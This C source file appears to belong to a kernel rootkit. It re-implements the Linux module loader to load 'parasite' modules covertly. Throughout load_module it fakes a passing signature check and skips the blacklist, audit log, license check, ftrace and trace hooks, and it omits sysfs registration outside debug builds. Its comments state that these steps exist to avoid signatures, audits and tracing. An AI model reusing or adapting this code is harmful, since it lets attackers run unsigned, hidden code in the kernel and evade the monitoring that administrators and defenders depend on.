#include "load_helpers.h"

/* kernel symbols */
int (*elf_validity_check)(struct load_info *) = NULL;   
int (*setup_load_info)(struct load_info *, int) = NULL;
int (*rewrite_section_headers)(struct load_info *, int) = NULL;
int (*check_modstruct_version)(const struct load_info *, struct module *) = NULL;
struct module* (*layout_and_allocate)(struct load_info *, int) = NULL;
int (*add_unformed_module)(struct module *) = NULL;
int (*percpu_modalloc)(struct module *, struct load_info *) = NULL;
int (*module_unload_init)(struct module *) = NULL;
void (*init_param_lock)(struct module *) = NULL;
int (*find_module_sections)(struct module *, struct load_info *) = NULL;
void (*setup_modinfo)(struct module *, struct load_info *) = NULL;
int (*simplify_symbols)(struct module *, const struct load_info *) = NULL;
int (*apply_relocations)(struct module *, const struct load_info *) = NULL;
int (*post_relocation)(struct module *, const struct load_info *) = NULL;
void (*flush_module_icache)(const struct module *) = NULL;
void (*cfi_init)(struct module *mod) = NULL;
void (*dynamic_debug_setup)(struct module *, struct _ddebug *, unsigned int ) = NULL;
int (*complete_formation)(struct module *, struct load_info *) = NULL;
int (*prepare_coming_module)(struct module *) = NULL;
int (*mod_sysfs_setup)(struct module *, const struct load_info *, struct kernel_param *, unsigned int ) = NULL;
int (*copy_module_elf)(struct module *, struct load_info *) = NULL;
int (*do_init_module)(struct module *) = NULL;
void (*mod_sysfs_teardown)(struct module *) = NULL;
void (*dynamic_debug_remove)(struct module *, struct _ddebug *) = NULL;
void (*cfi_cleanup) (struct module *) = NULL;
void (*module_unload_free)(struct module *) = NULL;
int (*unknown_module_param_cb)(char *, char *, const char *, void *) = NULL;


//we dont want signature checking but we would like our module to be recognized as signed
//call this insted of the kernel function
static int module_sig_check(struct load_info *info, int flags) {
	info->sig_ok = true;
	return 0;
}

//lookup all the symbols needed for the module load
void init_load_symbols() {

	void* addr = (void *)kallsyms_lookup_name("rcu_idle_exit");
    elf_validity_check = (void *)kallsyms_lookup_name("elf_validity_check");
    setup_load_info = (void *)kallsyms_lookup_name("setup_load_info");
    rewrite_section_headers = (void *)kallsyms_lookup_name("rewrite_section_headers");
    check_modstruct_version = (void *)kallsyms_lookup_name("check_modstruct_version");
    layout_and_allocate = (void *)kallsyms_lookup_name("layout_and_allocate");
    add_unformed_module = (void *)kallsyms_lookup_name("add_unformed_module");
    percpu_modalloc = (void *)kallsyms_lookup_name("percpu_modalloc");
    module_unload_init = (void *)kallsyms_lookup_name("module_unload_init");
    init_param_lock = (void *)kallsyms_lookup_name("init_param_lock");
    find_module_sections = (void *)kallsyms_lookup_name("find_module_sections");
    setup_modinfo = (void *)kallsyms_lookup_name("setup_modinfo");
    simplify_symbols = (void *)kallsyms_lookup_name("simplify_symbols");
    apply_relocations = (void *)kallsyms_lookup_name("apply_relocations");
    post_relocation = (void *)kallsyms_lookup_name("post_relocation");
    flush_module_icache = (void *)kallsyms_lookup_name("flush_module_icache");
    cfi_init = (void *)kallsyms_lookup_name("cfi_init");
    dynamic_debug_setup = (void *)kallsyms_lookup_name("dynamic_debug_setup");
    complete_formation = (void *)kallsyms_lookup_name("complete_formation");
    prepare_coming_module = (void *)kallsyms_lookup_name("prepare_coming_module");
    mod_sysfs_setup = (void *)kallsyms_lookup_name("mod_sysfs_setup");
    copy_module_elf = (void *)kallsyms_lookup_name("copy_module_elf");
    do_init_module = (void *)kallsyms_lookup_name("do_init_module");
    mod_sysfs_teardown = (void *)kallsyms_lookup_name("mod_sysfs_teardown");
	dynamic_debug_remove = (void *)kallsyms_lookup_name("dynamic_debug_remove");
    cfi_cleanup = (void *)kallsyms_lookup_name("cfi_cleanup");

	printk(KERN_INFO "vmalloc: %p\n", addr);
    printk(KERN_INFO "elf_validity_check: %p\n", elf_validity_check);
    printk(KERN_INFO "setup_load_info: %p\n", setup_load_info);
    printk(KERN_INFO "rewrite_section_headers: %p\n", rewrite_section_headers);
    printk(KERN_INFO "check_modstruct_version: %p\n", check_modstruct_version);
    printk(KERN_INFO "layout_and_allocate: %p\n", layout_and_allocate);
    printk(KERN_INFO "add_unformed_module: %p\n", add_unformed_module);
    printk(KERN_INFO "percpu_modalloc: %p\n", percpu_modalloc);
    printk(KERN_INFO "module_unload_init: %p\n", module_unload_init);
    printk(KERN_INFO "init_param_lock: %p\n", init_param_lock);
    printk(KERN_INFO "find_module_sections: %p\n", find_module_sections);
    printk(KERN_INFO "setup_modinfo: %p\n", setup_modinfo);
    printk(KERN_INFO "simplify_symbols: %p\n", simplify_symbols);
    printk(KERN_INFO "apply_relocations: %p\n", apply_relocations);
    printk(KERN_INFO "post_relocation: %p\n", post_relocation);
    printk(KERN_INFO "flush_module_icache: %p\n", flush_module_icache);
    printk(KERN_INFO "cfi_init: %p\n", cfi_init);
    printk(KERN_INFO "dynamic_debug_setup: %p\n", dynamic_debug_setup);
    printk(KERN_INFO "complete_formation: %p\n", complete_formation);
    printk(KERN_INFO "prepare_coming_module: %p\n", prepare_coming_module);
    printk(KERN_INFO "mod_sysfs_setup: %p\n", mod_sysfs_setup);
    printk(KERN_INFO "copy_module_elf: %p\n", copy_module_elf);
    printk(KERN_INFO "do_init_module: %p\n", do_init_module);
    printk(KERN_INFO "mod_sysfs_teardown: %p\n", mod_sysfs_teardown);
    printk(KERN_INFO "dynamic_debug_remove: %p\n", dynamic_debug_remove);
    printk(KERN_INFO "cfi_cleanup: %p\n", cfi_cleanup);
    

}

int copy_chunked_from_kernel(void *dst, const void *usrc, unsigned long len) {

    do {
		unsigned long n = min(len, COPY_CHUNK_SIZE);

		if (memcpy(dst, usrc, n) == NULL){
            printk(KERN_ERR "failed with len-err: %lu\n", n);
			return -EFAULT;
        }
        dst += n;
		usrc += n;
		len -= n;

	} while (len);

	return 0;

}

int load_module(struct load_info *info, const char __user *uargs, int flags)
{
	struct module *mod;
	long err = 0;
	char *after_dashes;


	printk(KERN_INFO "starting load\n");

	/*
	 * Signature check, customized we dont like signatures
	 */
	err = module_sig_check(info, flags);
	if (err)
		goto free_copy;
	
	printk(KERN_INFO "before valid\n");
	/*
	 * Do basic sanity checks against the ELF header and
	 * sections.
	 */
	err = elf_validity_check(info);
	if (err) {
		pr_err("Module has invalid ELF structures\n");
		goto free_copy;
	}

	printk(KERN_INFO "starting setup load\n");

	/*
	 * Everything checks out, so set up the section info
	 * in the info structure.
	 */
	err = setup_load_info(info, flags);
	if (err)
		goto free_copy;

	/*
	 * we dont like blacklists, dont check
	 */
	//if (blacklisted(info->name)) {
	//	err = -EPERM;
	//	pr_err("Module %s is blacklisted\n", info->name);
	//	goto free_copy;
	//}

	printk(KERN_INFO "before_rewrite\n");

	err = rewrite_section_headers(info, flags);
	if (err)
		goto free_copy;

	/* Check module struct version now, before we try to use module. */
	if (!check_modstruct_version(info, info->mod)) {
		err = -ENOEXEC;
		goto free_copy;
	}

	/* Figure out module layout, and allocate all the memory. */
	mod = layout_and_allocate(info, flags);
	if (IS_ERR(mod)) {
		err = PTR_ERR(mod);
		goto free_copy;
	}
	
	// we dont like audits
	//audit_log_kern_module(mod->name);

	/* Reserve our place in the list. */
	err = add_unformed_module(mod);
	if (err)
		goto free_module;

	// we dont like signatures
/*
#ifdef CONFIG_MODULE_SIG
	mod->sig_ok = info->sig_ok;
	if (!mod->sig_ok) {
		pr_notice_once("%s: module verification failed: signature "
			       "and/or required key missing - tainting "
			       "kernel\n", mod->name);
		add_taint_module(mod, TAINT_UNSIGNED_MODULE, LOCKDEP_STILL_OK);
	}
#endif
*/

	/* To avoid stressing percpu allocator, do this once we're unique. */
	err = percpu_modalloc(mod, info);
	if (err)
		goto unlink_mod;

	/* Now module is in final location, initialize linked lists, etc. */
	err = module_unload_init(mod);
	if (err)
		goto unlink_mod;

	init_param_lock(mod);

	/*
	 * Now we've got everything in the final locations, we can
	 * find optional sections.
	 */
	err = find_module_sections(mod, info);
	if (err)
		goto free_unload;

	// parasite modules dont care about licences
/*
	err = check_module_license_and_versions(mod);
	if (err)
		goto free_unload;
*/

	/* Set up MODINFO_ATTR fields */
	setup_modinfo(mod, info);

	/* Fix up syms, so that st_value is a pointer to location. */
	err = simplify_symbols(mod, info);
	if (err < 0)
		goto free_modinfo;

	err = apply_relocations(mod, info);
	if (err < 0)
		goto free_modinfo;

	err = post_relocation(mod, info);
	if (err < 0)
		goto free_modinfo;

	flush_module_icache(mod);

	/* Setup CFI for the module. */
	cfi_init(mod);

	/* Now copy in args */
	/* our uargs are in the kernel :) */
	//mod->args = strndup_user(uargs, ~0UL >> 1);
	mod ->args = kstrdup(uargs, GFP_KERNEL);
	if (IS_ERR(mod->args)) {
		err = PTR_ERR(mod->args);
		goto free_arch_cleanup;
	}

#ifdef DEBUG //we dont want this module to be debugged in a real enviroment
	dynamic_debug_setup(mod, info->debug, info->num_debug);
#endif

	/* Ftrace init must be called in the MODULE_STATE_UNFORMED state */
	// no ftrace for our parasites
	//ftrace_module_init(mod);

	/* Finally it's fully formed, ready to start executing. */
	err = complete_formation(mod, info);
	if (err)
		goto ddebug_cleanup;

	err = prepare_coming_module(mod);
	if (err)
		goto bug_cleanup;

	//disable for now
	/* Module is ready to execute: parsing args may do that. */
	// after_dashes = parse_args(mod->name, mod->args, mod->kp, mod->num_kp,
	// 			  -32768, 32767, mod,
	// 			  unknown_module_param_cb);
	// if (IS_ERR(after_dashes)) {
	// 	err = PTR_ERR(after_dashes);
	// 	goto coming_cleanup;
	// } else if (after_dashes) {
	// 	pr_warn("%s: parameters '%s' after `--' ignored\n",
	// 	       mod->name, after_dashes);
	// }

#ifdef DEBUG //no sysfs in a real enviroment
	/* Link in to sysfs. */
	err = mod_sysfs_setup(mod, info, mod->kp, mod->num_kp);
	if (err < 0)
		goto coming_cleanup;
#endif

	if (is_livepatch_module(mod)) {
		err = copy_module_elf(mod, info);
		if (err < 0)
			goto sysfs_cleanup;
	}

	/* Get rid of temporary copy. */
	//free_copy(info);
	vfree(info->hdr);

	/* Done! */
	//no tracing for us
	//trace_module_load(mod);

	printk(KERN_INFO "before_init\n");

	return do_init_module(mod);


// if we fail bad stuff happens, we cant clean up properly
 sysfs_cleanup:
#ifdef DEBUG	
	mod_sysfs_teardown(mod);
#endif
 coming_cleanup:
	mod->state = MODULE_STATE_GOING;
	//destroy_params(mod->kp, mod->num_kp);
	//blocking_notifier_call_chain(&module_notify_list,
	//			     MODULE_STATE_GOING, mod);
	//klp_module_going(mod);
 bug_cleanup:
	mod->state = MODULE_STATE_GOING;
	/* module_bug_cleanup needs module_mutex protection */
	//mutex_lock(&module_mutex);
	//module_bug_cleanup(mod);
	//mutex_unlock(&module_mutex);

 ddebug_cleanup:
 
#ifdef DEBUG
	dynamic_debug_remove(mod, info->debug);
#endif
	synchronize_rcu();
	kfree(mod->args);
 free_arch_cleanup:
	cfi_cleanup(mod);
	//module_arch_cleanup(mod);
 free_modinfo:
	//free_modinfo(mod);
 free_unload:
	module_unload_free(mod);
 unlink_mod:
 
	//mutex_lock(&module_mutex);
	/* Unlink carefully: kallsyms could be walking list. */
	//list_del_rcu(&mod->list);
	//mod_tree_remove(mod);
	//wake_up_all(&module_wq);
	/* Wait for RCU-sched synchronizing before releasing mod->list. */
	//synchronize_rcu();
	//mutex_unlock(&module_mutex);

 free_module:
	/* Free lock-classes; relies on the preceding sync_rcu() */
	//lockdep_free_key_range(mod->core_layout.base, mod->core_layout.size);

	//module_deallocate(mod, info);
 free_copy:
	//free_copy(info);
	vfree(info->hdr);

	return err;
}
